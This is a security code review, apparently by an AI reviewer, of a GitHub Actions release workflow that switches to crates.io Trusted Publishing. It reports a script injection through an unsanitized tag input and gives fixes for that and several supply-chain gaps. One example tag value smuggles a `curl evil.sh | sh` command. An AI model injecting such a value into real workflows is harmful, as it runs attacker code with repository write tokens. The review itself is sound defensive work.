---
phase: 19-crates-io-trusted-publishing-replace-the-long-lived-registry
reviewed: 2026-08-27T00:00:00Z
depth: standard
files_reviewed: 6
files_reviewed_list:
  - .github/workflows/pre-commit.yml
  - .github/workflows/release.yml
  - crates/paladin-web/openapi.json
  - docs/src/appendix/release-automation.md
  - docs/src/appendix/release-checklist.md
  - docs/src/contributing/development-setup.md
findings:
  critical: 1
  warning: 5
  info: 3
  total: 9
status: issues_found
---

# Phase 19: Code Review Report

**Reviewed:** 2026-08-27T00:00:00Z
**Depth:** standard
**Files Reviewed:** 6
**Status:** issues_found

## Summary

Phase 19 replaces the standing `CARGO_REGISTRY_TOKEN` repository secret with crates.io Trusted
Publishing (OIDC), scoped to a `crates-io` GitHub Environment restricted to `v*.*.*` tags. The
new `publish-crates` job itself is well-scoped: job-level `id-token: write`, no leftover
`secrets.CARGO_REGISTRY_TOKEN` references anywhere in the workflow or docs, a real (non-dry-run)
proof publish is documented, and the dry-run/real-mode split correctly skips the OIDC exchange
in dry-run mode. That part of the phase's stated objective is met and verified.

The review found one pre-existing but genuine script-injection vulnerability in `release.yml`
that the phase's "OIDC scoping, permissions blocks, injection risks in shell steps" review
mandate calls for directly: the `workflow_dispatch` `tag` input is interpolated unsanitized into
three separate `run:` shell blocks (`verify-tag-source`, `create-release`, and — via
`needs.create-release.outputs.version` — the `sbom` job), giving anyone able to trigger the
workflow arbitrary command execution on a runner that, in two of those three jobs, holds
`contents: write` and a live `GITHUB_TOKEN`. This is not introduced by Phase 19 (the pattern
predates this phase), but it sits squarely inside the file this phase was asked to harden and
was not addressed by it, so it is reported here as the primary finding.

Several lower-severity gaps round out the review: jobs without an explicit `permissions:` block
(inconsistent with the job-scoped least-privilege pattern the phase itself introduced for
`publish-crates`), a mutable `@master` action ref in a job with `contents: write`, an unpinned
`cargo install cross`, and a `GITHUB_OUTPUT` heredoc that uses a collidable literal `EOF`
delimiter against attacker-influenceable commit-message content. The docs
(`release-automation.md`, `release-checklist.md`, `development-setup.md`) are internally
consistent with each other and with the actual `release.yml` publish order and Trusted
Publishing mechanism; no stale `CARGO_REGISTRY_TOKEN` secret references remain. `openapi.json`
is a generated version-bump only and is clean. `pre-commit.yml` was not modified by this phase
and has no defects beyond the general action-pinning note below.

## Critical Issues

### CR-01: Unsanitized `workflow_dispatch` input interpolated into shell commands (script injection)

**File:** `.github/workflows/release.yml:47, 108, 351`
**Issue:** The `tag` workflow_dispatch input (`type: string`, fully attacker/operator-controlled)
is substituted directly into `run:` shell blocks via `${{ inputs.tag }}` / `${{
needs.create-release.outputs.version }}` (which is set verbatim from `inputs.tag` at line 108),
rather than being passed through an `env:` indirection first. GitHub Actions performs this
substitution as literal text expansion into the generated shell script *before* the shell ever
runs, so a tag value such as `v1.0.0"; curl evil.sh | sh; echo "` breaks out of the surrounding
quotes and executes arbitrary commands on the runner:

- `verify-tag-source` job, `Resolve release commit` step:
  `SHA=$(git rev-list -n 1 "${{ inputs.tag }}")` — line 47.
- `create-release` job, `Get version` step:
  `echo "version=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"` — line 108. This job holds
  `permissions: contents: write` and a live `GITHUB_TOKEN` (used two steps later to call
  `actions/create-release@v1`), so injection here can act with that token's scope.
- `sbom` job, `Generate CycloneDX SBOM` step:
  `cp paladin-ai.cdx.json "paladin-${{ needs.create-release.outputs.version }}.cdx.json"` —
  line 351. This job also holds `permissions: contents: write`. The tainted value flows here
  from `create-release`'s output, so the injection surfaces a second time even though the
  literal `${{ inputs.tag }}` text does not appear in this job.

Exploitability requires the ability to dispatch the workflow (write access to the repo, or a
leaked/compromised token with that scope) — it does not require merging a PR or pushing to
`main`, both of which are otherwise gated by the repository's branch-protection ruleset. That
makes this a real privilege-escalation path from "can dispatch a workflow" to "arbitrary code
execution with `contents: write` and `GITHUB_TOKEN`," independent of and not mitigated by the
Trusted Publishing OIDC hardening this phase added (the injected commands run before/around the
publish job, in jobs that never touch the crates.io credential but do hold their own
`GITHUB_TOKEN`).

**Fix:** Pass the input through an `env:` var, never `${{ }}`-interpolate an untrusted input
directly into a `run:` block:

```yaml
- name: Resolve release commit
  id: resolve
  env:
    RELEASE_TAG: ${{ inputs.tag }}
  run: |
    set -euo pipefail
    if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
      git fetch --tags --force --quiet origin
      SHA=$(git rev-list -n 1 -- "$RELEASE_TAG")
    else
      SHA="${{ github.sha }}"
    fi
    echo "sha=$SHA" >> "$GITHUB_OUTPUT"
```

Apply the same `env:` indirection at line 108 (`Get version`) and to the `sbom` job's `cp` /
`asset_path` / `asset_name` usages of `needs.create-release.outputs.version`. Optionally also add
an explicit `^v[0-9]+\.[0-9]+\.[0-9]+` regex validation of `inputs.tag` as a second layer, since
the release pipeline already assumes semver-shaped tags elsewhere (e.g. the SBOM/release-asset
filenames, the `prerelease:` check).

## Warnings

### WR-01: Jobs missing an explicit `permissions:` block

**File:** `.github/workflows/release.yml:29-86` (`verify-tag-source`, `test` jobs)
**Issue:** `verify-tag-source` and `test` have no `permissions:` key and no workflow-level
default either, so they run with whatever the repository/organization's default `GITHUB_TOKEN`
permissions are (which may be broader than `contents: read`). Every other job in this file
(`create-release`, `build-docker`, `build-binaries`, `sbom`, `publish-crates`) was given an
explicit, scoped `permissions:` block — `publish-crates` in particular is the job this phase
added `id-token: write` to, following least-privilege. The two jobs without a block break that
same discipline and depend on org-wide defaults staying safe, which is exactly the kind of
implicit trust this phase's OIDC work was meant to remove.
**Fix:** Add `permissions: contents: read` to `verify-tag-source` and `test` explicitly (or add
a workflow-level `permissions: contents: read` default and let jobs elevate only where needed),
mirroring the pattern `.github/workflows/pre-commit.yml:20-21` already uses at the top level.

### WR-02: Mutable `@master` action ref used in a job with `contents: write`

**File:** `.github/workflows/release.yml:266-270`
**Issue:** `build-binaries` pins `dtolnay/rust-toolchain@master` — a mutable branch reference,
not a version tag or commit SHA — while the same job holds `permissions: contents: write` and
runs on every release tag. Every other third-party action in this file is pinned to a version
tag (`@v4`, `@v1`, `@v3`, `dtolnay/rust-toolchain@stable` elsewhere in the same file). A
compromised or unreviewed push to that action's `master` branch would execute immediately in
this job on the next release, with write access to repo contents.
**Fix:** Pin to a commit SHA (`dtolnay/rust-toolchain@<sha> # master as of <date>`) or, if the
`toolchain:` input requirement genuinely needs `@master`, document why `@stable`/a tagged release
cannot be used instead (the existing code comment explains why `@stable` is wrong for this job,
but not why an unpinned mutable ref is an acceptable substitute).

### WR-03: `cargo install cross` is unpinned

**File:** `.github/workflows/release.yml:272-274`
**Issue:** `cargo install cross` has no version pin and no `--locked`, unlike the other two tool
installs in this same file (`cargo install cargo-release --locked` documented in
`release-automation.md`, and `cargo install cargo-cyclonedx --locked` at line 342). A new
`cross` release published between two workflow runs changes the toolchain used to
cross-compile the `aarch64-unknown-linux-gnu` release binary without any corresponding review or
lockfile change.
**Fix:** `cargo install cross --locked --version <pinned>` (or vendor via a pinned Docker image
tag), matching the reproducibility discipline used for the other two installed tools.

### WR-04: `GITHUB_OUTPUT` heredoc uses a collidable literal delimiter

**File:** `.github/workflows/release.yml:113-127`
**Issue:** The changelog step builds `CHANGELOG` from `git log --pretty=format:"- %s" ...` (raw
commit subject lines) and writes it to `$GITHUB_OUTPUT` using a heredoc delimited by the literal
string `EOF`:
```bash
{
  echo "changelog<<EOF"
  echo "$CHANGELOG"
  echo "EOF"
} >> "$GITHUB_OUTPUT"
```
If any commit merged to `main` before a release has a subject line that is exactly `EOF` on its
own line, the heredoc terminates early and any subsequent line(s) from that same commit body (or
crafted content) are appended to `$GITHUB_OUTPUT` as additional, attacker-chosen `key=value`
lines — a known GitHub Actions output-injection class. Commit subjects only reach `main` via a
reviewed PR under this repo's branch-protection ruleset, so the bar is higher than CR-01, but
it's the same root cause (unsanitized data flowing into a workflow-command-adjacent sink) and
easy to close.
**Fix:** Use a random/unique delimiter instead of the literal string `EOF`, e.g.
`delim="EOF_$(openssl rand -hex 8)"` and use `$delim` in place of both `EOF` occurrences.

### WR-05: Docker image and binary artifacts are not gated on the test suite

**File:** `.github/workflows/release.yml:157-160, 219-225`
**Issue:** `build-docker` and `build-binaries` both declare `needs: create-release` only — not
`needs: [test, create-release]`. Only `publish-crates` waits on `test`. The job comment at line
69-70 states "Full test suite — gates crates.io publishing (a release must not publish if tests
fail)," which is accurate but implicitly concedes the Docker image pushed to the public `ghcr.io`
registry and the binaries attached to the GitHub release are *not* gated by test results — a
release with a failing test suite can still ship a tagged Docker image and downloadable
binaries, just not a crates.io publish. This is pre-existing (predates Phase 19), but is worth
surfacing since it's easy to misread the existing comment as "tests gate the whole release."
**Fix:** Either add `test` to both jobs' `needs:` list, or expand the code comment to state
explicitly that only crates.io publishing is test-gated and that Docker/binary artifacts are
not, so the asymmetry is a documented choice rather than a latent surprise.

## Info

### IN-01: Third-party Actions pinned to mutable version tags, not commit SHAs

**File:** `.github/workflows/release.yml` (throughout), `.github/workflows/pre-commit.yml:37-73`
**Issue:** All third-party actions (`actions/checkout@v4`, `docker/*@v3`/`@v5`,
`dtolnay/rust-toolchain@stable`, `rust-lang/crates-io-auth-action@v1`,
`pre-commit/action@v3.0.1`, etc.) are pinned to mutable version tags rather than commit SHAs.
This is a common, widely-accepted convention, but it is a standard supply-chain hardening
recommendation (a compromised maintainer account or tag re-push changes what runs without any
diff in this repo) worth a deliberate call-out given `publish-crates` now runs with `id-token:
write` and mints a real, if short-lived, publish credential.
**Fix:** Pin `rust-lang/crates-io-auth-action` (and optionally the other release-critical
actions) to a commit SHA with a version comment, e.g. `rust-lang/crates-io-auth-action@<sha> #
v1.x.x`.

### IN-02: Archived/unmaintained GitHub Actions still in use

**File:** `.github/workflows/release.yml:131, 307, 317, 354`
**Issue:** `actions/create-release@v1` and `actions/upload-release-asset@v1` are both archived by
GitHub (no longer receiving updates, including security fixes) and are already known internally
to have no upsert behavior (`release-automation.md`'s "Known operational caveats" documents the
re-dispatch failure mode this causes). Not introduced by this phase, but worth flagging as a
maintenance/quality debt item since this file was just substantially reworked.
**Fix:** Consider migrating to `softprops/action-gh-release` (actively maintained, supports
upsert) or a `gh release create`/`gh release upload` shell-based approach, in a follow-up phase.

### IN-03: Fragile substring matching for "already published" tolerance

**File:** `.github/workflows/release.yml:454-461`
**Issue:** The re-runnability tolerance for an already-published crate version relies on
`grep -qiE "already (exists|uploaded)|is already uploaded|already published"` against captured
`cargo publish` stderr/stdout. This is inherently coupled to cargo's current error-message
wording; a future cargo release that rephrases the "already published" error would cause this
job to hard-fail on a condition it's explicitly designed to tolerate (fail-closed, so not unsafe,
just brittle). Low priority given low likelihood of message drift and the job's own
re-runnability design intent.
**Fix:** If cargo ever exposes a structured/machine-readable error (e.g. via `--message-format
json` on `cargo publish`), prefer matching on that over free-text stderr; otherwise leave as-is
with a comment noting the coupling.

---

_Reviewed: 2026-08-27T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
